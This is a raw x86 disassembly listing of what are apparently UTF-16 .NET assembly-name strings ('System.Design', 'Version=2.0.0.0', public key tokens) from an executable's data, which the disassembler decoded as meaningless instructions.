  40a81e:	arpl   WORD PTR [eax],ax
  40a820:	dec    ebx
  40a821:	add    BYTE PTR [ebp+0x0],ah
  40a824:	jns    0x40a826
  40a826:	push   esp
  40a827:	add    BYTE PTR [edi+0x0],ch
  40a82a:	imul   eax,DWORD PTR [eax],0x65
  40a82d:	add    BYTE PTR [esi+0x0],ch
  40a830:	cmp    eax,0x31003300
  40a835:	add    BYTE PTR [edx+0x0],ah
  40a838:	data16 add BYTE PTR [ebx],dh
  40a83b:	add    BYTE PTR [eax],bh
  40a83d:	add    BYTE PTR ds:0x61003600,dh
  40a843:	add    BYTE PTR [eax+eax*1+0x33],ah
  40a847:	add    BYTE PTR [esi],dh
  40a849:	add    BYTE PTR [eax+eax*1],dh
  40a84c:	add    BYTE PTR gs:[ebx],dh
  40a84f:	add    BYTE PTR ds:0x53b28000,dh
  40a855:	add    BYTE PTR [ecx+0x0],bh
  40a858:	jae    0x40a85a
  40a85a:	je     0x40a85c
  40a85c:	add    BYTE PTR gs:[ebp+0x0],ch
  40a860:	add    BYTE PTR cs:[edi+0x0],dl
  40a864:	add    BYTE PTR gs:[edx+0x0],ah
  40a868:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  40a86d:	add    BYTE PTR [esi+0x0],ch
  40a870:	popa   
  40a871:	add    BYTE PTR [ebp+0x0],ch
  40a874:	imul   eax,DWORD PTR [eax],0x440063
  40a87a:	popa   
  40a87b:	add    BYTE PTR [eax+eax*1+0x61],dh
  40a87f:	add    BYTE PTR [eax+eax*1],ch
  40a882:	and    BYTE PTR [eax],al
  40a884:	push   esi
  40a885:	add    BYTE PTR [ebp+0x0],ah
  40a888:	jb     0x40a88a
  40a88a:	jae    0x40a88c
  40a88c:	imul   eax,DWORD PTR [eax],0x6e006f
  40a892:	cmp    eax,0x2e003300
  40a897:	add    BYTE PTR ds:0x30002e00,dh
  40a89d:	add    BYTE PTR [esi],ch
  40a89f:	add    BYTE PTR [eax],dh
  40a8a1:	add    BYTE PTR [eax+eax*1],ch
  40a8a4:	and    BYTE PTR [eax],al
  40a8a6:	inc    ebx
  40a8a7:	add    BYTE PTR [ebp+0x0],dh
  40a8aa:	ins    BYTE PTR es:[edi],dx
  40a8ab:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a8af:	add    BYTE PTR [edx+0x0],dh
  40a8b2:	add    BYTE PTR gs:0x65006e00,bh
  40a8b9:	add    BYTE PTR [ebp+0x0],dh
  40a8bc:	je     0x40a8be
  40a8be:	jb     0x40a8c0
  40a8c0:	popa   
  40a8c1:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a8c5:	add    BYTE PTR [eax],ah
  40a8c7:	add    BYTE PTR [eax+0x0],dl
  40a8ca:	jne    0x40a8cc
  40a8cc:	bound  eax,QWORD PTR [eax]
  40a8ce:	ins    BYTE PTR es:[edi],dx
  40a8cf:	add    BYTE PTR [ecx+0x0],ch
  40a8d2:	arpl   WORD PTR [eax],ax
  40a8d4:	dec    ebx
  40a8d5:	add    BYTE PTR [ebp+0x0],ah
  40a8d8:	jns    0x40a8da
  40a8da:	push   esp
  40a8db:	add    BYTE PTR [edi+0x0],ch
  40a8de:	imul   eax,DWORD PTR [eax],0x65
  40a8e1:	add    BYTE PTR [esi+0x0],ch
  40a8e4:	cmp    eax,0x31003300
  40a8e9:	add    BYTE PTR [edx+0x0],ah
  40a8ec:	data16 add BYTE PTR [ebx],dh
  40a8ef:	add    BYTE PTR [eax],bh
  40a8f1:	add    BYTE PTR ds:0x61003600,dh
  40a8f7:	add    BYTE PTR [eax+eax*1+0x33],ah
  40a8fb:	add    BYTE PTR [esi],dh
  40a8fd:	add    BYTE PTR [eax+eax*1],dh
  40a900:	add    BYTE PTR gs:[ebx],dh
  40a903:	add    BYTE PTR ds:0x53c08000,dh
  40a909:	add    BYTE PTR [ecx+0x0],bh
  40a90c:	jae    0x40a90e
  40a90e:	je     0x40a910
  40a910:	add    BYTE PTR gs:[ebp+0x0],ch
  40a914:	add    BYTE PTR cs:[edi+0x0],dl
  40a918:	add    BYTE PTR gs:[edx+0x0],ah
  40a91c:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  40a921:	add    BYTE PTR [esi+0x0],ch
  40a924:	popa   
  40a925:	add    BYTE PTR [ebp+0x0],ch
  40a928:	imul   eax,DWORD PTR [eax],0x440063
  40a92e:	popa   
  40a92f:	add    BYTE PTR [eax+eax*1+0x61],dh
  40a933:	add    BYTE PTR [esi],ch
  40a935:	add    BYTE PTR [eax+eax*1+0x65],al
  40a939:	add    BYTE PTR [ebx+0x0],dh
  40a93c:	imul   eax,DWORD PTR [eax],0x6e0067
  40a942:	sub    al,0x0
  40a944:	and    BYTE PTR [eax],al
  40a946:	push   esi
  40a947:	add    BYTE PTR [ebp+0x0],ah
  40a94a:	jb     0x40a94c
  40a94c:	jae    0x40a94e
  40a94e:	imul   eax,DWORD PTR [eax],0x6e006f
  40a954:	cmp    eax,0x2e003300
  40a959:	add    BYTE PTR ds:0x30002e00,dh
  40a95f:	add    BYTE PTR [esi],ch
  40a961:	add    BYTE PTR [eax],dh
  40a963:	add    BYTE PTR [eax+eax*1],ch
  40a966:	and    BYTE PTR [eax],al
  40a968:	inc    ebx
  40a969:	add    BYTE PTR [ebp+0x0],dh
  40a96c:	ins    BYTE PTR es:[edi],dx
  40a96d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a971:	add    BYTE PTR [edx+0x0],dh
  40a974:	add    BYTE PTR gs:0x65006e00,bh
  40a97b:	add    BYTE PTR [ebp+0x0],dh
  40a97e:	je     0x40a980
  40a980:	jb     0x40a982
  40a982:	popa   
  40a983:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a987:	add    BYTE PTR [eax],ah
  40a989:	add    BYTE PTR [eax+0x0],dl
  40a98c:	jne    0x40a98e
  40a98e:	bound  eax,QWORD PTR [eax]
  40a990:	ins    BYTE PTR es:[edi],dx
  40a991:	add    BYTE PTR [ecx+0x0],ch
  40a994:	arpl   WORD PTR [eax],ax
  40a996:	dec    ebx
  40a997:	add    BYTE PTR [ebp+0x0],ah
  40a99a:	jns    0x40a99c
  40a99c:	push   esp
  40a99d:	add    BYTE PTR [edi+0x0],ch
  40a9a0:	imul   eax,DWORD PTR [eax],0x65
  40a9a3:	add    BYTE PTR [esi+0x0],ch
  40a9a6:	cmp    eax,0x31003300
  40a9ab:	add    BYTE PTR [edx+0x0],ah
  40a9ae:	data16 add BYTE PTR [ebx],dh
  40a9b1:	add    BYTE PTR [eax],bh
  40a9b3:	add    BYTE PTR ds:0x61003600,dh
  40a9b9:	add    BYTE PTR [eax+eax*1+0x33],ah
  40a9bd:	add    BYTE PTR [esi],dh
  40a9bf:	add    BYTE PTR [eax+eax*1],dh
  40a9c2:	add    BYTE PTR gs:[ebx],dh
  40a9c5:	add    BYTE PTR ds:0x53b68000,dh
  40a9cb:	add    BYTE PTR [ecx+0x0],bh
  40a9ce:	jae    0x40a9d0
  40a9d0:	je     0x40a9d2
  40a9d2:	add    BYTE PTR gs:[ebp+0x0],ch
  40a9d6:	add    BYTE PTR cs:[edi+0x0],dl
  40a9da:	add    BYTE PTR gs:[edx+0x0],ah
  40a9de:	add    BYTE PTR cs:[ebp+0x0],al
  40a9e2:	outs   dx,BYTE PTR ds:[esi]
  40a9e3:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a9e7:	add    BYTE PTR [eax+eax*1+0x79],dh
  40a9eb:	add    BYTE PTR [esi],ch
  40a9ed:	add    BYTE PTR [eax+eax*1+0x65],al
  40a9f1:	add    BYTE PTR [ebx+0x0],dh
  40a9f4:	imul   eax,DWORD PTR [eax],0x6e0067
  40a9fa:	sub    al,0x0
  40a9fc:	and    BYTE PTR [eax],al
  40a9fe:	push   esi
  40a9ff:	add    BYTE PTR [ebp+0x0],ah
  40aa02:	jb     0x40aa04
  40aa04:	jae    0x40aa06
  40aa06:	imul   eax,DWORD PTR [eax],0x6e006f
  40aa0c:	cmp    eax,0x2e003300
  40aa11:	add    BYTE PTR ds:0x30002e00,dh
  40aa17:	add    BYTE PTR [esi],ch
  40aa19:	add    BYTE PTR [eax],dh
  40aa1b:	add    BYTE PTR [eax+eax*1],ch
  40aa1e:	and    BYTE PTR [eax],al
  40aa20:	inc    ebx
  40aa21:	add    BYTE PTR [ebp+0x0],dh
  40aa24:	ins    BYTE PTR es:[edi],dx
  40aa25:	add    BYTE PTR [eax+eax*1+0x75],dh
  40aa29:	add    BYTE PTR [edx+0x0],dh
  40aa2c:	add    BYTE PTR gs:0x65006e00,bh
  40aa33:	add    BYTE PTR [ebp+0x0],dh
  40aa36:	je     0x40aa38
  40aa38:	jb     0x40aa3a
  40aa3a:	popa   
  40aa3b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40aa3f:	add    BYTE PTR [eax],ah
  40aa41:	add    BYTE PTR [eax+0x0],dl
  40aa44:	jne    0x40aa46
  40aa46:	bound  eax,QWORD PTR [eax]
  40aa48:	ins    BYTE PTR es:[edi],dx
  40aa49:	add    BYTE PTR [ecx+0x0],ch
  40aa4c:	arpl   WORD PTR [eax],ax
  40aa4e:	dec    ebx
  40aa4f:	add    BYTE PTR [ebp+0x0],ah
  40aa52:	jns    0x40aa54
  40aa54:	push   esp
  40aa55:	add    BYTE PTR [edi+0x0],ch
  40aa58:	imul   eax,DWORD PTR [eax],0x65
  40aa5b:	add    BYTE PTR [esi+0x0],ch
  40aa5e:	cmp    eax,0x37006200
  40aa63:	add    BYTE PTR [edi],dh
  40aa65:	add    BYTE PTR [ecx+0x0],ah
  40aa68:	xor    eax,0x35006300
  40aa6d:	add    BYTE PTR [esi],dh
  40aa6f:	add    BYTE PTR [ecx],dh
  40aa71:	add    BYTE PTR [ecx],bh
  40aa73:	add    BYTE PTR [ebx],dh
  40aa75:	add    BYTE PTR [eax+eax*1],dh
  40aa78:	add    BYTE PTR gs:[eax],dh
  40aa7b:	add    BYTE PTR [eax],bh
  40aa7d:	add    BYTE PTR [ecx],bh
  40aa7f:	add    BYTE PTR [eax+0x790053b0],al
  40aa85:	add    BYTE PTR [ebx+0x0],dh
  40aa88:	je     0x40aa8a
  40aa8a:	add    BYTE PTR gs:[ebp+0x0],ch
  40aa8e:	add    BYTE PTR cs:[edi+0x0],dl
  40aa92:	add    BYTE PTR gs:[edx+0x0],ah
  40aa96:	add    BYTE PTR cs:[ebp+0x0],al
  40aa9a:	js     0x40aa9c
  40aa9c:	je     0x40aa9e
  40aa9e:	add    BYTE PTR gs:[esi+0x0],ch
  40aaa2:	jae    0x40aaa4
  40aaa4:	imul   eax,DWORD PTR [eax],0x6e006f
  40aaaa:	jae    0x40aaac
  40aaac:	sub    al,0x0
  40aaae:	and    BYTE PTR [eax],al
  40aab0:	push   esi
  40aab1:	add    BYTE PTR [ebp+0x0],ah
  40aab4:	jb     0x40aab6
  40aab6:	jae    0x40aab8
  40aab8:	imul   eax,DWORD PTR [eax],0x6e006f
  40aabe:	cmp    eax,0x2e003300
  40aac3:	add    BYTE PTR ds:0x30002e00,dh
  40aac9:	add    BYTE PTR [esi],ch
  40aacb:	add    BYTE PTR [eax],dh
  40aacd:	add    BYTE PTR [eax+eax*1],ch
  40aad0:	and    BYTE PTR [eax],al
  40aad2:	inc    ebx
  40aad3:	add    BYTE PTR [ebp+0x0],dh
  40aad6:	ins    BYTE PTR es:[edi],dx
  40aad7:	add    BYTE PTR [eax+eax*1+0x75],dh
  40aadb:	add    BYTE PTR [edx+0x0],dh
  40aade:	add    BYTE PTR gs:0x65006e00,bh
  40aae5:	add    BYTE PTR [ebp+0x0],dh
  40aae8:	je     0x40aaea
  40aaea:	jb     0x40aaec
  40aaec:	popa   
  40aaed:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40aaf1:	add    BYTE PTR [eax],ah
  40aaf3:	add    BYTE PTR [eax+0x0],dl
  40aaf6:	jne    0x40aaf8
  40aaf8:	bound  eax,QWORD PTR [eax]
  40aafa:	ins    BYTE PTR es:[edi],dx
  40aafb:	add    BYTE PTR [ecx+0x0],ch
  40aafe:	arpl   WORD PTR [eax],ax
  40ab00:	dec    ebx
  40ab01:	add    BYTE PTR [ebp+0x0],ah
  40ab04:	jns    0x40ab06
  40ab06:	push   esp
  40ab07:	add    BYTE PTR [edi+0x0],ch
  40ab0a:	imul   eax,DWORD PTR [eax],0x65
  40ab0d:	add    BYTE PTR [esi+0x0],ch
  40ab10:	cmp    eax,0x31003300
  40ab15:	add    BYTE PTR [edx+0x0],ah
  40ab18:	data16 add BYTE PTR [ebx],dh
  40ab1b:	add    BYTE PTR [eax],bh
  40ab1d:	add    BYTE PTR ds:0x61003600,dh
  40ab23:	add    BYTE PTR [eax+eax*1+0x33],ah
  40ab27:	add    BYTE PTR [esi],dh
  40ab29:	add    BYTE PTR [eax+eax*1],dh
  40ab2c:	add    BYTE PTR gs:[ebx],dh
  40ab2f:	add    BYTE PTR ds:0x53be8000,dh
  40ab35:	add    BYTE PTR [ecx+0x0],bh
  40ab38:	jae    0x40ab3a
  40ab3a:	je     0x40ab3c
  40ab3c:	add    BYTE PTR gs:[ebp+0x0],ch
  40ab40:	add    BYTE PTR cs:[edi+0x0],dl
  40ab44:	add    BYTE PTR gs:[edx+0x0],ah
  40ab48:	add    BYTE PTR cs:[ebp+0x0],al
  40ab4c:	js     0x40ab4e
  40ab4e:	je     0x40ab50
  40ab50:	add    BYTE PTR gs:[esi+0x0],ch
  40ab54:	jae    0x40ab56
  40ab56:	imul   eax,DWORD PTR [eax],0x6e006f
  40ab5c:	jae    0x40ab5e
  40ab5e:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40ab63:	add    BYTE PTR [ebx+0x0],dh
  40ab66:	imul   eax,DWORD PTR [eax],0x6e0067
  40ab6c:	sub    al,0x0
  40ab6e:	and    BYTE PTR [eax],al
  40ab70:	push   esi
  40ab71:	add    BYTE PTR [ebp+0x0],ah
  40ab74:	jb     0x40ab76
  40ab76:	jae    0x40ab78
  40ab78:	imul   eax,DWORD PTR [eax],0x6e006f
  40ab7e:	cmp    eax,0x2e003300
  40ab83:	add    BYTE PTR ds:0x30002e00,dh
  40ab89:	add    BYTE PTR [esi],ch
  40ab8b:	add    BYTE PTR [eax],dh
  40ab8d:	add    BYTE PTR [eax+eax*1],ch
  40ab90:	and    BYTE PTR [eax],al
  40ab92:	inc    ebx
  40ab93:	add    BYTE PTR [ebp+0x0],dh
  40ab96:	ins    BYTE PTR es:[edi],dx
  40ab97:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ab9b:	add    BYTE PTR [edx+0x0],dh
  40ab9e:	add    BYTE PTR gs:0x65006e00,bh
  40aba5:	add    BYTE PTR [ebp+0x0],dh
  40aba8:	je     0x40abaa
  40abaa:	jb     0x40abac
  40abac:	popa   
  40abad:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40abb1:	add    BYTE PTR [eax],ah
  40abb3:	add    BYTE PTR [eax+0x0],dl
  40abb6:	jne    0x40abb8
  40abb8:	bound  eax,QWORD PTR [eax]
  40abba:	ins    BYTE PTR es:[edi],dx
  40abbb:	add    BYTE PTR [ecx+0x0],ch
  40abbe:	arpl   WORD PTR [eax],ax
  40abc0:	dec    ebx
  40abc1:	add    BYTE PTR [ebp+0x0],ah
  40abc4:	jns    0x40abc6
  40abc6:	push   esp
  40abc7:	add    BYTE PTR [edi+0x0],ch
  40abca:	imul   eax,DWORD PTR [eax],0x65
  40abcd:	add    BYTE PTR [esi+0x0],ch
  40abd0:	cmp    eax,0x31003300
  40abd5:	add    BYTE PTR [edx+0x0],ah
  40abd8:	data16 add BYTE PTR [ebx],dh
  40abdb:	add    BYTE PTR [eax],bh
  40abdd:	add    BYTE PTR ds:0x61003600,dh
  40abe3:	add    BYTE PTR [eax+eax*1+0x33],ah
  40abe7:	add    BYTE PTR [esi],dh
  40abe9:	add    BYTE PTR [eax+eax*1],dh
  40abec:	add    BYTE PTR gs:[ebx],dh
  40abef:	add    BYTE PTR ds:0x53a88000,dh
  40abf5:	add    BYTE PTR [ecx+0x0],bh
  40abf8:	jae    0x40abfa
  40abfa:	je     0x40abfc
  40abfc:	add    BYTE PTR gs:[ebp+0x0],ch
  40ac00:	add    BYTE PTR cs:[edi+0x0],dl
  40ac04:	add    BYTE PTR gs:[edx+0x0],ah
  40ac08:	add    BYTE PTR cs:[ebp+0x0],cl
  40ac0c:	outs   dx,DWORD PTR ds:[esi]
  40ac0d:	add    BYTE PTR [edx+0x0],ah
  40ac10:	imul   eax,DWORD PTR [eax],0x65006c
  40ac16:	sub    al,0x0
  40ac18:	and    BYTE PTR [eax],al
  40ac1a:	push   esi
  40ac1b:	add    BYTE PTR [ebp+0x0],ah
  40ac1e:	jb     0x40ac20
  40ac20:	jae    0x40ac22
  40ac22:	imul   eax,DWORD PTR [eax],0x6e006f
  40ac28:	cmp    eax,0x2e003200
  40ac2d:	add    BYTE PTR [eax],dh
  40ac2f:	add    BYTE PTR [esi],ch
  40ac31:	add    BYTE PTR [eax],dh
  40ac33:	add    BYTE PTR [esi],ch
  40ac35:	add    BYTE PTR [eax],dh
  40ac37:	add    BYTE PTR [eax+eax*1],ch
  40ac3a:	and    BYTE PTR [eax],al
  40ac3c:	inc    ebx
  40ac3d:	add    BYTE PTR [ebp+0x0],dh
  40ac40:	ins    BYTE PTR es:[edi],dx
  40ac41:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ac45:	add    BYTE PTR [edx+0x0],dh
  40ac48:	add    BYTE PTR gs:0x65006e00,bh
  40ac4f:	add    BYTE PTR [ebp+0x0],dh
  40ac52:	je     0x40ac54
  40ac54:	jb     0x40ac56
  40ac56:	popa   
  40ac57:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ac5b:	add    BYTE PTR [eax],ah
  40ac5d:	add    BYTE PTR [eax+0x0],dl
  40ac60:	jne    0x40ac62
  40ac62:	bound  eax,QWORD PTR [eax]
  40ac64:	ins    BYTE PTR es:[edi],dx
  40ac65:	add    BYTE PTR [ecx+0x0],ch
  40ac68:	arpl   WORD PTR [eax],ax
  40ac6a:	dec    ebx
  40ac6b:	add    BYTE PTR [ebp+0x0],ah
  40ac6e:	jns    0x40ac70
  40ac70:	push   esp
  40ac71:	add    BYTE PTR [edi+0x0],ch
  40ac74:	imul   eax,DWORD PTR [eax],0x65
  40ac77:	add    BYTE PTR [esi+0x0],ch
  40ac7a:	cmp    eax,0x30006200
  40ac7f:	add    BYTE PTR [ebx],dh
  40ac81:	add    BYTE PTR [esi+0x0],ah
  40ac84:	xor    eax,0x37006600
  40ac89:	add    BYTE PTR [esi+0x0],ah
  40ac8c:	xor    DWORD PTR [eax],eax
  40ac8e:	xor    DWORD PTR [eax],eax
  40ac90:	add    BYTE PTR fs:0x61003000,dh
  40ac97:	add    BYTE PTR [ebx],dh
  40ac99:	add    BYTE PTR [ecx+0x0],ah
  40ac9c:	add    al,0x53
  40ac9f:	add    BYTE PTR [ecx+0x0],bh
  40aca2:	jae    0x40aca4
  40aca4:	je     0x40aca6
  40aca6:	add    BYTE PTR gs:[ebp+0x0],ch
  40acaa:	add    BYTE PTR cs:[edi+0x0],dl
  40acae:	add    BYTE PTR gs:[edx+0x0],ah
  40acb2:	add    BYTE PTR cs:[edx+0x0],dl
  40acb6:	add    BYTE PTR gs:[edi+0x0],ah
  40acba:	jne    0x40acbc
  40acbc:	ins    BYTE PTR es:[edi],dx
  40acbd:	add    BYTE PTR [ecx+0x0],ah
  40acc0:	jb     0x40acc2
  40acc2:	inc    ebp
  40acc3:	add    BYTE PTR [eax+0x0],bh
  40acc6:	jo     0x40acc8
  40acc8:	jb     0x40acca
  40acca:	add    BYTE PTR gs:[ebx+0x0],dh
  40acce:	jae    0x40acd0
  40acd0:	imul   eax,DWORD PTR [eax],0x6e006f
  40acd6:	jae    0x40acd8
  40acd8:	sub    al,0x0
  40acda:	and    BYTE PTR [eax],al
  40acdc:	push   esi
  40acdd:	add    BYTE PTR [ebp+0x0],ah
  40ace0:	jb     0x40ace2
  40ace2:	jae    0x40ace4
  40ace4:	imul   eax,DWORD PTR [eax],0x6e006f
  40acea:	cmp    eax,0x2e003200
  40acef:	add    BYTE PTR [eax],dh
  40acf1:	add    BYTE PTR [esi],ch
  40acf3:	add    BYTE PTR [eax],dh
  40acf5:	add    BYTE PTR [esi],ch
  40acf7:	add    BYTE PTR [eax],dh
  40acf9:	add    BYTE PTR [eax+eax*1],ch
  40acfc:	and    BYTE PTR [eax],al
  40acfe:	inc    ebx
  40acff:	add    BYTE PTR [ebp+0x0],dh
  40ad02:	ins    BYTE PTR es:[edi],dx
  40ad03:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ad07:	add    BYTE PTR [edx+0x0],dh
  40ad0a:	add    BYTE PTR gs:0x65006e00,bh
  40ad11:	add    BYTE PTR [ebp+0x0],dh
  40ad14:	je     0x40ad16
  40ad16:	jb     0x40ad18
  40ad18:	popa   
  40ad19:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ad1d:	add    BYTE PTR [eax],ah
  40ad1f:	add    BYTE PTR [eax+0x0],dl
  40ad22:	jne    0x40ad24
  40ad24:	bound  eax,QWORD PTR [eax]
  40ad26:	ins    BYTE PTR es:[edi],dx
  40ad27:	add    BYTE PTR [ecx+0x0],ch
  40ad2a:	arpl   WORD PTR [eax],ax
  40ad2c:	dec    ebx
  40ad2d:	add    BYTE PTR [ebp+0x0],ah
  40ad30:	jns    0x40ad32
  40ad32:	push   esp
  40ad33:	add    BYTE PTR [edi+0x0],ch
  40ad36:	imul   eax,DWORD PTR [eax],0x65
  40ad39:	add    BYTE PTR [esi+0x0],ch
  40ad3c:	cmp    eax,0x30006200
  40ad41:	add    BYTE PTR [ebx],dh
  40ad43:	add    BYTE PTR [esi+0x0],ah
  40ad46:	xor    eax,0x37006600
  40ad4b:	add    BYTE PTR [esi+0x0],ah
  40ad4e:	xor    DWORD PTR [eax],eax
  40ad50:	xor    DWORD PTR [eax],eax
  40ad52:	add    BYTE PTR fs:0x61003000,dh
  40ad59:	add    BYTE PTR [ebx],dh
  40ad5b:	add    BYTE PTR [ecx+0x0],ah
  40ad5e:	sub    BYTE PTR [edx+0x790053],0x73
  40ad65:	add    BYTE PTR [eax+eax*1+0x65],dh
  40ad69:	add    BYTE PTR [ebp+0x0],ch
  40ad6c:	add    BYTE PTR cs:[edi+0x0],dl
  40ad70:	add    BYTE PTR gs:[edx+0x0],ah
  40ad74:	add    BYTE PTR cs:[edx+0x0],dl
  40ad78:	outs   dx,DWORD PTR ds:[esi]
  40ad79:	add    BYTE PTR [ebp+0x0],dh
  40ad7c:	je     0x40ad7e
  40ad7e:	imul   eax,DWORD PTR [eax],0x67006e
  40ad84:	sub    al,0x0
  40ad86:	and    BYTE PTR [eax],al
  40ad88:	push   esi
  40ad89:	add    BYTE PTR [ebp+0x0],ah
  40ad8c:	jb     0x40ad8e
  40ad8e:	jae    0x40ad90
  40ad90:	imul   eax,DWORD PTR [eax],0x6e006f
  40ad96:	cmp    eax,0x2e003300
  40ad9b:	add    BYTE PTR ds:0x30002e00,dh
  40ada1:	add    BYTE PTR [esi],ch
  40ada3:	add    BYTE PTR [eax],dh
  40ada5:	add    BYTE PTR [eax+eax*1],ch
  40ada8:	and    BYTE PTR [eax],al
  40adaa:	inc    ebx
  40adab:	add    BYTE PTR [ebp+0x0],dh
  40adae:	ins    BYTE PTR es:[edi],dx
  40adaf:	add    BYTE PTR [eax+eax*1+0x75],dh
  40adb3:	add    BYTE PTR [edx+0x0],dh
  40adb6:	add    BYTE PTR gs:0x65006e00,bh
  40adbd:	add    BYTE PTR [ebp+0x0],dh
  40adc0:	je     0x40adc2
  40adc2:	jb     0x40adc4
  40adc4:	popa   
  40adc5:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40adc9:	add    BYTE PTR [eax],ah
  40adcb:	add    BYTE PTR [eax+0x0],dl
  40adce:	jne    0x40add0
  40add0:	bound  eax,QWORD PTR [eax]
  40add2:	ins    BYTE PTR es:[edi],dx
  40add3:	add    BYTE PTR [ecx+0x0],ch
  40add6:	arpl   WORD PTR [eax],ax
  40add8:	dec    ebx
  40add9:	add    BYTE PTR [ebp+0x0],ah
  40addc:	jns    0x40adde
  40adde:	push   esp
  40addf:	add    BYTE PTR [edi+0x0],ch
  40ade2:	imul   eax,DWORD PTR [eax],0x65
  40ade5:	add    BYTE PTR [esi+0x0],ch
  40ade8:	cmp    eax,0x31003300
  40aded:	add    BYTE PTR [edx+0x0],ah
  40adf0:	data16 add BYTE PTR [ebx],dh
  40adf3:	add    BYTE PTR [eax],bh
  40adf5:	add    BYTE PTR ds:0x61003600,dh
  40adfb:	add    BYTE PTR [eax+eax*1+0x33],ah
  40adff:	add    BYTE PTR [esi],dh
  40ae01:	add    BYTE PTR [eax+eax*1],dh
  40ae04:	add    BYTE PTR gs:[ebx],dh
  40ae07:	add    BYTE PTR ds:0x53ac8000,dh
  40ae0d:	add    BYTE PTR [ecx+0x0],bh
  40ae10:	jae    0x40ae12
  40ae12:	je     0x40ae14
  40ae14:	add    BYTE PTR gs:[ebp+0x0],ch
  40ae18:	add    BYTE PTR cs:[edi+0x0],dl
  40ae1c:	add    BYTE PTR gs:[edx+0x0],ah
  40ae20:	add    BYTE PTR cs:[ebx+0x0],dl
  40ae24:	add    BYTE PTR gs:[edx+0x0],dh
  40ae28:	jbe    0x40ae2a
  40ae2a:	imul   eax,DWORD PTR [eax],0x650063
  40ae30:	jae    0x40ae32
  40ae32:	sub    al,0x0
  40ae34:	and    BYTE PTR [eax],al
  40ae36:	push   esi
  40ae37:	add    BYTE PTR [ebp+0x0],ah
  40ae3a:	jb     0x40ae3c
  40ae3c:	jae    0x40ae3e
  40ae3e:	imul   eax,DWORD PTR [eax],0x6e006f
  40ae44:	cmp    eax,0x2e003200
  40ae49:	add    BYTE PTR [eax],dh
  40ae4b:	add    BYTE PTR [esi],ch
  40ae4d:	add    BYTE PTR [eax],dh
  40ae4f:	add    BYTE PTR [esi],ch
  40ae51:	add    BYTE PTR [eax],dh
  40ae53:	add    BYTE PTR [eax+eax*1],ch
  40ae56:	and    BYTE PTR [eax],al
  40ae58:	inc    ebx
  40ae59:	add    BYTE PTR [ebp+0x0],dh
  40ae5c:	ins    BYTE PTR es:[edi],dx
  40ae5d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ae61:	add    BYTE PTR [edx+0x0],dh
  40ae64:	add    BYTE PTR gs:0x65006e00,bh
  40ae6b:	add    BYTE PTR [ebp+0x0],dh
  40ae6e:	je     0x40ae70
  40ae70:	jb     0x40ae72
  40ae72:	popa   
  40ae73:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ae77:	add    BYTE PTR [eax],ah
  40ae79:	add    BYTE PTR [eax+0x0],dl
  40ae7c:	jne    0x40ae7e
  40ae7e:	bound  eax,QWORD PTR [eax]
  40ae80:	ins    BYTE PTR es:[edi],dx
  40ae81:	add    BYTE PTR [ecx+0x0],ch
  40ae84:	arpl   WORD PTR [eax],ax
  40ae86:	dec    ebx
  40ae87:	add    BYTE PTR [ebp+0x0],ah
  40ae8a:	jns    0x40ae8c
  40ae8c:	push   esp
  40ae8d:	add    BYTE PTR [edi+0x0],ch
  40ae90:	imul   eax,DWORD PTR [eax],0x65
  40ae93:	add    BYTE PTR [esi+0x0],ch
  40ae96:	cmp    eax,0x30006200
  40ae9b:	add    BYTE PTR [ebx],dh
  40ae9d:	add    BYTE PTR [esi+0x0],ah
  40aea0:	xor    eax,0x37006600
  40aea5:	add    BYTE PTR [esi+0x0],ah
  40aea8:	xor    DWORD PTR [eax],eax
  40aeaa:	xor    DWORD PTR [eax],eax
  40aeac:	add    BYTE PTR fs:0x61003000,dh
  40aeb3:	add    BYTE PTR [ebx],dh
  40aeb5:	add    BYTE PTR [ecx+0x0],ah
  40aeb8:	xor    BYTE PTR [edx+0x69004d],0x63
  40aebf:	add    BYTE PTR [edx+0x0],dh
  40aec2:	outs   dx,DWORD PTR ds:[esi]
  40aec3:	add    BYTE PTR [ebx+0x0],dh
  40aec6:	outs   dx,DWORD PTR ds:[esi]
  40aec7:	add    BYTE PTR [esi+0x0],ah
  40aeca:	je     0x40aecc
  40aecc:	add    BYTE PTR cs:[esi+0x0],dl
  40aed0:	imul   eax,DWORD PTR [eax],0x750073
  40aed6:	popa   
  40aed7:	add    BYTE PTR [eax+eax*1+0x53],ch
  40aedb:	add    BYTE PTR [eax+eax*1+0x75],dh
  40aedf:	add    BYTE PTR [eax+eax*1+0x69],ah
  40aee3:	add    BYTE PTR [edi+0x0],ch
  40aee6:	sub    al,0x0
  40aee8:	and    BYTE PTR [eax],al
  40aeea:	push   esi
  40aeeb:	add    BYTE PTR [ebp+0x0],ah
  40aeee:	jb     0x40aef0
  40aef0:	jae    0x40aef2
  40aef2:	imul   eax,DWORD PTR [eax],0x6e006f
  40aef8:	cmp    eax,0x2e003200
  40aefd:	add    BYTE PTR [eax],dh
  40aeff:	add    BYTE PTR [esi],ch
  40af01:	add    BYTE PTR [eax],dh
  40af03:	add    BYTE PTR [esi],ch
  40af05:	add    BYTE PTR [eax],dh
  40af07:	add    BYTE PTR [eax+eax*1],ch
  40af0a:	and    BYTE PTR [eax],al
  40af0c:	inc    ebx
  40af0d:	add    BYTE PTR [ebp+0x0],dh
  40af10:	ins    BYTE PTR es:[edi],dx
  40af11:	add    BYTE PTR [eax+eax*1+0x75],dh
  40af15:	add    BYTE PTR [edx+0x0],dh
  40af18:	add    BYTE PTR gs:0x65006e00,bh
  40af1f:	add    BYTE PTR [ebp+0x0],dh
  40af22:	je     0x40af24
  40af24:	jb     0x40af26
  40af26:	popa   
  40af27:	add    BYTE PTR [eax+eax*1+0x2c],ch
